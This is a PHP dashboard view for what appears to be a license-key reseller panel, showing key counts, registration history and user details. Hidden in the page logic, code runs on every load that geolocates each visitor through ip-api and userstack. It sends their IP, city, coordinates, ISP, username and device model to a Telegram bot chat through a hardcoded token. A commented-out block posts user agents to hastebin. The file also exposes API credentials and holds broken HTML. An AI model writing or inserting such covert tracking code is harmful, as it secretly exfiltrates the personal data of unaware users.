<?= $this->extend('Layout/Starter') ?>
<?= $this->section('content') ?>
<?php

include('conn.php');

// For Credits
$sql = "SELECT * FROM credit where id=1";
$result = mysqli_query($conn, $sql);
$credit = mysqli_fetch_assoc($result);

// For Keys count
$sql = "SELECT COUNT(*) as id_keys FROM keys_code";
$result = mysqli_query($conn, $sql);
$keycount = mysqli_fetch_assoc($result);

// For Active Keys count
$sql = "SELECT COUNT(devices) as devices FROM keys_code";
$result = mysqli_query($conn, $sql);
$active = mysqli_fetch_assoc($result);

// For In-Active Keys Count
$sql = "SELECT COUNT(*) as devices FROM keys_code where devices IS NULL";
$result = mysqli_query($conn, $sql);
$inactive = mysqli_fetch_assoc($result);

// For Users Count
$sql = "SELECT COUNT(*) as id_users FROM users";
$result = mysqli_query($conn, $sql);
$users = mysqli_fetch_assoc($result);

?>

<?php
$rsppos = "";


/*$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get the device model name
preg_match('/\(([^)]+)\)/', $user_agent, $matches);
$device_model = $matches[1];

$ch = curl_init(); 
	    curl_setopt($ch, CURLOPT_URL,            "https://hastebin.com/documents" );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt($ch, CURLOPT_POST,           1 );
        curl_setopt($ch, CURLOPT_POSTFIELDS, array('data'=>$user_agent));
        curl_setopt($ch, CURLOPT_HTTPHEADER,     array('Content-Type: multipart/form-data'));
        $response_json = curl_exec($ch);
        curl_close($ch);
        $response_array = json_decode($response_json,true);



$rpoti = json_decode($response_json)->key;
$rsppos = "https://hastebin.com/raw/".$rpoti;
        */
        
        $ua=$_SERVER['HTTP_USER_AGENT'];
$query = http_build_query([
  'access_key' => 'ef4442f2b757f9013615cdca436310e0',
  'ua' => $ua,
]);

$ch = curl_init('http://api.userstack.com/detect?' . $query);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$json = curl_exec($ch);
curl_close($ch);

$api_result = json_decode($json, true);

$name = $api_result['brand']." ".$api_result['name'];


  if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'){
         $url = "https://";   
   } else  {
         $url = "http://";   }
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      

    $ip = $_SERVER['REMOTE_ADDR']; // your ip address here
    $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
    if($query && $query['status'] == 'success')
    {
            $haul = '𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗜𝗧𝗬 - ' . $query['city']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗦𝗧𝗔𝗧𝗘 - ' . $query['region']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗭𝗜𝗣𝗖𝗢𝗗𝗘 - ' . $query['zip']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗢𝗢𝗥𝗗𝗜𝗡𝗔𝗧𝗘𝗦 - ' . $query['lat'] . ', ' . $query['lon']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 - ' . $query['as']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗧𝗜𝗠𝗘𝗭𝗢𝗡𝗘 - ' . $query['timezone']."\n".'CURRENY PAGE URL - ' . $url."\n".'IP ADDRESS - ' . $ip."\n".'USERNAME/,NAME - ' . getName($user)."\n".'DEVICE MODEL - ' ."<b>". $name."</b>";
  $apiToken = "5982824943:AAHV66f0xTTexZwW5qyYBZ3kO7EghOKslB0";
  $data = [
      'chat_id' => '@kaurolop',
      'text' => $haul
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?parse_mode=html&" .
                                 http_build_query($data) );


    }


?>

<div class="col-lg-12">
        <?= $this->include('Layout/msgStatus') ?>
    
<div class="col-lg-4">
        <div class="card mb-3">
            <div class="card-header text-center text-white bg-dark" style="background: linear-gradient(0.98turn, #0072ff, #00ffdc, #efff00);">𝑫𝒆𝒕𝒂𝒊𝒍𝒔</div>
              <div class="card-body" style="background: #ffdc64;">
                <ul class="list-group list-hover mb-3">
                    <li class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">𝑇𝑜𝑡𝑎𝑙 𝐾𝑒𝑦𝑠<span class="badge text-success" >
                            <?php echo $keycount['id_keys']; ?>
                        </span>
                    </li>
                    <li class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">𝐴𝑐𝑡𝑖𝑣𝑒 𝐾𝑒𝑦𝑠<span class="badge text-success">
                            <?php echo $active['devices']; ?>
                        </span>
                    </li>
                    <li class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">𝐼𝑛-𝐴𝑐𝑡𝑖𝑣𝑒 𝐾𝑒𝑦𝑠<span class="badge text-danger">
                            <?php echo $inactive['devices']; ?>
                        </span>
                    </li>
                    <li class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">Users Count<span class="badge text-danger">
                            <?php echo $users['id_users']; ?>
                        </span>
                    </li>
                </ul>
               </div>
             </div>
           </div>
           
    <div class="col-lg-8" style="padding:15px;">
        <div class="card mb-3">
            <div class="card-header text-white"style="background: linear-gradient(0.98turn, #0072ff, #00ffdc, #efff00);">
                Registration History
            </div>
                        <div class="card-body"style="background: linear-gradient(0.93turn, #ff8d00, #fb00ff, #fff700);">
                <div class="table-responsive">
                    <table class="table table-sm table-bordered table-hover text-center
                     <ul class="" style="background: url(); no-repeat center center; background-size: 100% 100%; ="navbarDropdown">
<tbody>
                            <?php foreach ($history as $h) : ?>
                                <?php $in = explode("|", $h->info) ?>
                                <tr>
                                    <td><span class="align-middle badge text-white">#3812<?= $h->id_history ?></span></td>
                                    
                                    
                                    
                                 

            
            
                                   <td><span class="align-middle badge text-white"><?= $in[0] ?></td>
                                    <td><span class="align-middle badge text-white"><?= $in[1] ?>**</span></td>
                                    <td><span class="align-middle badge text-white"><?php $value = $in[2]; if($value < 24) { echo "$value Hour(s)"; } else { $pbarmyff = $value/24; echo "$pbarmyff Day(s)"; } ?></span></td>
                                    <td><span class="align-middle badge text-white"><?= $in[3] ?> Devices</span></td>
                                    <td><i class="align-middle badge text-white"><?= $time::parse($h->created_at)->humanize() ?></i></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    <div class="col-lg-4" style="padding:15px;">
        <div class="card mb-3">
            <div class="card-header text-white"style="background: linear-gradient(0.98turn, #0072ff, #00ffdc, #efff00);">
                Information
            </div>
            <div class="card-body">
                <ul class="list-group list-hover mb-3">
                    <li class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                        Roles
                        <span class="badge text-dark">
                            <?= getLevel($user->level) ?>
                        </span>
                    </li>
                    <li class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                        Saldo
                        <span class="badge text-dark">
                            $<?= $user->saldo ?>
                        </span>
                    </li>
                </ul>
                <ul class="list-group">
                    <li class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                        Login Time
                        <span class="badge text-dark">
                            <?= $time::parse(session()->time_since)->humanize() ?>
                        </span>
                    </li>
                    <li class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                        Auto Logout
                        <span class="badge text-dark">
                            <?= $time::now()->difference($time::parse(session()->time_login))->humanize() ?>
                        </span>
                    </li>
                </ul>
            </div>
        </div>
    </div>
  
</div>
<?= $this->endSection() ?>